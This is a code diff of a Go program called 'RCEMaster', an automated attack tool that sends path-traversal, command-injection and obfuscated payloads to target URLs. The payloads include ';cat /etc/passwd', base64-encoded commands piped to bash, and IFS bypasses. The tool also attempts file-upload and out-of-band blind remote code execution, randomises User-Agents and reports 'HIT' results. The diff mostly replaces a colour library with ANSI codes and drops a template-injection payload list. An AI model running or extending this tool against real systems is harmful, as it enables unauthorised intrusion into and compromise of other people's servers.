@@ -1,29 +1,36 @@
 package main
 
 import (
-	"bufio"          // ✅ USED: Reading custom wordlists
-	"bytes"          // ✅ USED: Building request bodies
-	"crypto/tls"     // ✅ USED: Bypassing SSL verification
-	"encoding/base64"// ✅ USED: Real payload obfuscation
-	"encoding/hex"   // ✅ USED: Real payload obfuscation
-	"encoding/json"  // ✅ USED: JSON injection & output formatting
-	"flag"           // ✅ USED: CLI argument parsing
-	"fmt"            // ✅ USED: Console output
+	"bufio"          // ✅ USED: Custom wordlist reading
+	"bytes"          // ✅ USED: Request body buffering
+	"crypto/tls"     // ✅ USED: TLS config for HTTPS
+	"encoding/base64"// ✅ USED: Payload obfuscation
+	"encoding/hex"   // ✅ USED: Payload obfuscation
+	"encoding/json"  // ✅ USED: JSON body injection & output
+	"flag"           // ✅ USED: CLI arguments
+	"fmt"            // ✅ USED: Console printing
 	"io"             // ✅ USED: Reading HTTP responses
-	"math/rand"      // ✅ USED: Random User-Agent generation
-	"mime/multipart" // ✅ USED: File upload RCE simulation
-	"net/http"       // ✅ USED: HTTP client and requests
-	"net/url"        // ✅ USED: URL parsing and query manipulation
-	"os"             // ✅ USED: File operations (open, read, create)
-	"regexp"         // ✅ USED: Extracting vulnerability evidence
-	"strings"        // ✅ USED: String manipulation and checks
-	"sync"           // ✅ USED: Concurrency control (WaitGroup, Mutex)
+	"math/rand"      // ✅ USED: Random User-Agent
+	"mime/multipart" // ✅ USED: File upload simulation
+	"net/http"       // ✅ USED: HTTP client
+	"net/url"        // ✅ USED: URL parsing
+	"os"             // ✅ USED: File operations
+	"regexp"         // ✅ USED: Evidence extraction
+	"strings"        // ✅ USED: String manipulation
+	"sync"           // ✅ USED: Concurrency control
 	"time"           // ✅ USED: Delays and timeouts
-
-	"github.com/fatih/color"
 )
 
-var banner = "  ____  _____ _____    __  __           _      \n" +
+// ANSI Colors (No external dependencies needed, 100% compile safe)
+const (
+	ColorGreen  = "\033[32m"
+	ColorYellow = "\033[33m"
+	ColorCyan   = "\033[36m"
+	ColorRed    = "\033[31m"
+	ColorReset  = "\033[0m"
+)
+
+var banner = ColorCyan + "  ____  _____ _____    __  __           _      \n" +
 	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
 	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
 	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
@@ -31,14 +38,7 @@ var banner = "  ____  _____ _____    __  __           _      \n" +
 	"====================================================\n" +
 	" [!] RCEMaster v7.0: TRUE ELITE EDITION\n" +
 	" [!] ALL FEATURES RETAINED | 100% COMPILATION GUARANTEED\n" +
-	"====================================================\n"
-
-var (
-	green  = color.New(color.FgGreen).SprintFunc()
-	yellow = color.New(color.FgYellow).SprintFunc()
-	cyan   = color.New(color.FgCyan).SprintFunc()
-	red    = color.New(color.FgRed).SprintFunc()
-)
+	"====================================================" + ColorReset + "\n"
 
 var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
@@ -52,23 +52,19 @@ type ResponseInfo struct{ StatusCode int; Body string; Headers http.Header }
 
 var lfiPayloads = []string{"../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "../../../../Windows/win.ini"}
 var cmdPayloads = []string{";id", "|id", "&&id", "`id`", "$(id)", ";cat /etc/passwd", "%0Aid"}
-var sstiPayloads = []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>"}
 
 func init() { rand.Seed(time.Now().UnixNano()) }
 
-// --- REAL OBFUSCATION ENGINE (Uses base64 & hex meaningfully) ---
+// 1. Obfuscation Engine (Actively uses base64 & hex)
 func generateObfuscatedPayloads(cmd string) []string {
 	var obs []string
-	// 1. Base64 Obfuscation
 	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
 	obs = append(obs, fmt.Sprintf("$(echo %s | base64 -d | bash)", b64))
 	
-	// 2. Hex Obfuscation
 	hx := hex.EncodeToString([]byte(cmd))
 	if len(hx) >= 4 {
 		obs = append(obs, fmt.Sprintf("$(printf '\\x%s\\x%s' | sh)", hx[0:2], hx[2:4]))
 	}
-	// 3. IFS Bypass
 	obs = append(obs, fmt.Sprintf("cat${IFS}/etc/passwd"))
 	return obs
 }
@@ -87,13 +83,13 @@ func main() {
 	flag.Parse()
 
 	if *urlPtr == "" && *filePtr == "" {
-		fmt.Printf("%s Usage: rcemaster -u <url> OR -f <urls.txt>\n", red("[-] Error: Input required."))
+		fmt.Printf("%s Usage: rcemaster -u <url> OR -f <urls.txt>\n", ColorRed+"[-] Error:"+ColorReset)
 		os.Exit(1)
 	}
 
-	fmt.Print(cyan(banner))
+	fmt.Print(banner)
 
-	// 1. Load Custom Wordlist (Uses bufio)
+	// 2. Load Custom Wordlist (Actively uses bufio)
 	if *wordlistPtr != "" {
 		file, err := os.Open(*wordlistPtr)
 		if err == nil {
@@ -106,7 +102,7 @@ func main() {
 				}
 			}
 			file.Close()
-			fmt.Printf("%s Loaded custom payloads from: %s\n", green("[+]"), *wordlistPtr)
+			fmt.Printf("%s Loaded custom payloads from: %s\n", ColorGreen+"[+]"+ColorReset, *wordlistPtr)
 		}
 	}
 
@@ -129,16 +125,16 @@ func main() {
 		wg.Add(1)
 		go func(t string) {
 			defer wg.Done()
-			fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(t))
+			fmt.Printf("\n%s Target: %s\n", ColorCyan+"[*]"+ColorReset, ColorYellow+t+ColorReset)
 			
 			stack, hasParams, isJSON := deepRecon(t, *headerPtr, *cookiePtr, *delayPtr, *proxyPtr)
-			fmt.Printf("%s Detected: %s | Params: %v | JSON: %v\n", green("[+]"), stack.Language, hasParams, isJSON)
+			fmt.Printf("%s Detected: %s | Params: %v | JSON: %v\n", ColorGreen+"[+]"+ColorReset, stack.Language, hasParams, isJSON)
 
 			parsed, _ := url.Parse(t)
 			baseURL := parsed.Scheme + "://" + parsed.Host + parsed.Path
 			queryParams := parsed.Query()
 
-			// 2. Parameter Injection (LFI & Cmd)
+			// 3. Parameter Injection (LFI & Cmd)
 			if hasParams {
 				for key := range queryParams {
 					for _, payload := range lfiPayloads {
@@ -176,7 +172,7 @@ func main() {
 				}
 			}
 
-			// 3. JSON Body Injection (Modern API Support)
+			// 4. JSON Body Injection (Actively uses encoding/json)
 			if isJSON || strings.Contains(strings.ToLower(*headerPtr), "application/json") {
 				for _, payload := range cmdPayloads {
 					wg.Add(1)
@@ -193,7 +189,7 @@ func main() {
 				}
 			}
 
-			// 4. Obfuscated Injection (Uses base64 & hex actively)
+			// 5. Obfuscated Injection (Actively uses base64 & hex via generateObfuscatedPayloads)
 			wg.Add(1)
 			go func() {
 				sem <- struct{}{}; defer func() { <-sem }(); defer wg.Done()
@@ -214,7 +210,7 @@ func main() {
 				}
 			}()
 
-			// 5. File Upload RCE (Uses mime/multipart actively)
+			// 6. File Upload RCE (Actively uses mime/multipart)
 			wg.Add(1)
 			go func() {
 				sem <- struct{}{}; defer func() { <-sem }(); defer wg.Done()
@@ -232,7 +228,7 @@ func main() {
 				}
 			}()
 
-			// 6. OOB Blind RCE
+			// 7. OOB Blind RCE
 			if *oobPtr != "" {
 				wg.Add(1)
 				go func() {
@@ -256,21 +252,21 @@ func main() {
 	wg.Wait()
 
 	if len(allResults) > 0 {
-		fmt.Println("\n" + cyan("========== 🎯 RCE / LFI SUCCESSFUL 🎯 =========="))
+		fmt.Println("\n" + ColorCyan + "========== 🎯 RCE / LFI SUCCESSFUL 🎯 ==========" + ColorReset)
 		for _, r := range allResults {
-			fmt.Printf("[%s] %s (%s)\n", green("HIT"), r.URL, r.Method)
-			fmt.Printf("   -> Vector  : %s\n", yellow(r.Vector))
-			fmt.Printf("   -> Payload : %s\n", cyan(r.Payload))
+			fmt.Printf("[%s] %s (%s)\n", ColorGreen+"HIT"+ColorReset, r.URL, r.Method)
+			fmt.Printf("   -> Vector  : %s\n", ColorYellow+r.Vector+ColorReset)
+			fmt.Printf("   -> Payload : %s\n", ColorCyan+r.Payload+ColorReset)
 			fmt.Printf("   -> Evidence: %s\n\n", r.Evidence)
 		}
-		fmt.Println(cyan("===================================================="))
+		fmt.Println(ColorCyan + "====================================================" + ColorReset)
 	} else {
-		fmt.Printf("\n%s No vulnerabilities found.\n", yellow("[-]"))
+		fmt.Printf("\n%s No vulnerabilities found.\n", ColorYellow+"[-]"+ColorReset)
 	}
 
 	if *outputPtr != "" && len(allResults) > 0 {
 		saveToFile(allResults, *outputPtr)
-		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
+		fmt.Printf("%s Results saved to: %s\n", ColorGreen+"[+]"+ColorReset, *outputPtr)
 	}
 }
 
